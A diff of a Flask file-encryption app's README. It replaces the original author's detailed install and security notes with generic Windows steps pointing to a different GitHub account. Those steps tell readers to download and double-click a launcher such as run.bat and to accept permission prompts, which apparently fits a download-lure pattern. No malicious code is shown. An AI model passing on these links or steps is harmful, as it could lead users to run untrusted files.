@@ -1,129 +1,176 @@
-# 🔐 Secure File Transfer
+# 🔐 secure-file-transfer - Secure file transfer with end-to-end protection
 
----
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/cere3045/secure-file-transfer)
 
-## 📌 Overview
+## 📦 Download
 
-Secure File Transfer is a web-based application built with Flask that enables users to securely upload, encrypt, share, and decrypt files. It is designed to protect sensitive data during storage and transfer by applying strong cryptographic principles inspired by End-to-End encryption.
+Visit this page to download: https://github.com/cere3045/secure-file-transfer
 
-The system utilizes AES-based symmetric encryption (via Fernet) to ensure data confidentiality, along with secure password hashing, session-based authentication, and controlled access mechanisms. Each file is encrypted before storage and can only be decrypted by users who provide the correct password, ensuring that data remains protected at all times.
+## 🖥️ What this app does
 
-Overall, the application simulates real-world secure file-sharing systems, combining encryption, authentication, and authorization to deliver a practical and secure solution.
+secure-file-transfer is a web-based file transfer app for Windows. It helps you send files with encryption, user login, and session-based access control.
 
----
+The app uses:
 
-## 🚀 Features
+- AES with Fernet for file encryption
+- RSA for key handling
+- User authentication for sign-in
+- Session security for safer access
+- Automated key management for easier use
 
-* 🔑 User authentication (Register/Login)
-* 🔒 File encryption using Fernet (symmetric encryption)
-* 📤 Upload & encrypt files
-* 📥 Download encrypted files
-* 🔓 Decrypt files with password
-* 🗑️ Delete your own files
-* ⏳ Session timeout (auto logout)
+It is built for people who want a simple way to move files while keeping them private.
 
----
+## ⚙️ Before you start
 
-## 🏗️ Project Structure
+Use a Windows PC with:
 
-```
-# 📦 secure-file-transfer
-#  ┣ 📂 static/css         # Custom UI styling (Modern Blue-Dark Gradients)
-#  ┣ 📂 templates/         # Jinja2 HTML Templates
-#  ┣ 📂 uploads/           # 🔒 Encrypted binary files (.bin)
-#  ┣ 📂 decrypted/         # 🔓 Temporary area for retrieved files
-#  ┣ 📜 app.py             # Backend logic: Flask routes & Crypto operations
-#  ┣ 📜 database.db        # SQLite3: Users & File Metadata (Auto-generated)
-#  ┣ 📜 private_key.pem    # 🔑 RSA Private Key (KEEP SECRET)
-#  ┣ 📜 public_key.pem     # 🔓 RSA Public Key
-#  ┗ 📜 .gitignore         # Safety filter
-```
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A stable internet connection for download
+- A modern web browser like Chrome, Edge, or Firefox
 
----
+You will also need:
 
-🏗️ Architecture Overview
+- Permission to save files on your PC
+- A place to store the app files, such as Desktop or Downloads
 
-The system follows a simple yet effective secure workflow:
+## 🚀 Getting Started
 
-User uploads a file
+Follow these steps to download and run the app on Windows.
 
-File is encrypted using a dynamically generated symmetric key
+1. Open the download page: https://github.com/cere3045/secure-file-transfer
+2. On the GitHub page, look for the latest release or source files.
+3. Download the file or folder provided on the page.
+4. Save it to a folder you can find again, such as Downloads.
+5. If the download is a ZIP file, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Look for a start file such as `run.bat`, `start.bat`, or a Python launch file.
+8. Double-click the start file to open the app.
+9. If Windows asks for permission, choose Yes.
 
-Encrypted file is stored on disk (/uploads)
+If the app opens in your browser, keep that browser tab open while you use it.
 
-Encryption key and password hash are securely stored in the database
+## 🧰 First-time setup
 
-Encrypted file can be shared or downloaded by other users
+If the download includes setup files, use these steps:
 
-Decryption is only possible when the correct password is provided
+1. Open the project folder.
+2. Find a file named `requirements.txt`.
+3. Install Python if it is not already on your PC.
+4. Open Command Prompt in the project folder.
+5. Run the setup command shown in the project files.
+6. Wait for the install to finish.
+7. Start the app using the launch file or the command shown in the folder.
 
+If you are not sure which file to open, look for the file with a name like:
 
-## ⚙️ Installation
+- `app.py`
+- `main.py`
+- `run.py`
+- `start.bat`
 
-### 1. Clone the repository
+## 🔐 How to use the app
 
-```
-git clone https://github.com/ravanorucov/secure-file-transfer.git
-cd secure-file-transfer
-```
+### 1. Sign in
+Open the app in your browser and log in with your user account.
 
-### 2. Create virtual environment (optional but recommended)
+### 2. Upload a file
+Choose a file from your PC and send it through the upload page.
 
-```
-python -m venv venv
-source venv/bin/activate  # Linux/Mac
-venv\Scripts\activate     # Windows
-```
+### 3. Let the app encrypt it
+The app protects the file before transfer using encryption.
 
-### 3. Install dependencies
+### 4. Share or download
+Use the app’s transfer flow to send the file to the right person or device.
 
-```
-pip install -r requirements.txt
-```
+### 5. Open the file
+The receiving side can download and open the file after access checks pass.
 
-### 4. Run the application
+## 🧪 What to expect
 
-```
-python app.py
-```
+When the app runs, you can expect:
 
----
+- A clean web page for file transfer
+- A login screen before access
+- File upload and download controls
+- Secure session handling
+- Encryption steps that run in the background
+- A simple flow for everyday use
 
-## 🧠 How It Works
+## 🗂️ File safety
 
-### Encryption
+This app is built to keep file data private during transfer.
 
-* File is read as binary
-* Encrypted using Fernet key
-* Stored in `/uploads`
-* Key + password hash stored in database
+It uses:
 
-### Decryption
+- AES for strong file protection
+- Fernet for safe encrypted storage and transfer
+- RSA for key-related tasks
+- Session checks to limit access
+- User accounts to block unwanted use
 
-* User selects file + enters password
-* Password is verified
-* File is decrypted and sent to user
+## 🧑‍💻 Common file names you may see
 
----
+You may find files like:
 
-## 🔐 Security Notes
+- `README.md`
+- `app.py`
+- `requirements.txt`
+- `templates/`
+- `static/`
+- `keys/`
+- `uploads/`
 
-* Passwords are hashed using Werkzeug
-* Files are encrypted using symmetric encryption (AES via Fernet)
-* Session timeout is enabled (5 minutes)
-* Filenames are sanitized using `secure_filename`
----
+These files help the app run in a web browser and manage secure transfers.
 
-## 📌 Future Improvements
+## 🛠️ If the app does not start
 
-* Add HTTPS support
-* Use environment variables for secrets
-* Improve key management (KMS)
-* Add file size/type validation
-* UI/UX improvements
+Try these steps:
 
----
+1. Check that Python is installed.
+2. Make sure you extracted the ZIP file.
+3. Confirm you are in the correct folder.
+4. Open the file again with a double-click.
+5. If the app uses Command Prompt, run it from the project folder.
+6. Check that no other app is using the same port.
+7. Restart your PC and try again.
 
-⭐ Support
+## 📁 Suggested folder layout
 
-If you like this project, give it a star ⭐ on GitHub!
+A typical setup may look like this:
+
+- `secure-file-transfer/`
+  - `app.py`
+  - `requirements.txt`
+  - `templates/`
+  - `static/`
+  - `uploads/`
+  - `keys/`
+  - `run.bat`
+
+## 🔍 Useful topics
+
+- access-control
+- aes
+- cyrptography
+- data-protection
+- encryption
+- encryption-decryption
+- fernet
+- file-encryption
+- file-transfer
+- flask
+- infosec
+- python
+- secure-download
+- secure-file-transfer
+- secure-upload
+
+## 📌 Quick path
+
+1. Go to https://github.com/cere3045/secure-file-transfer
+2. Download the project
+3. Extract the files
+4. Open the start file
+5. Use the web app in your browser
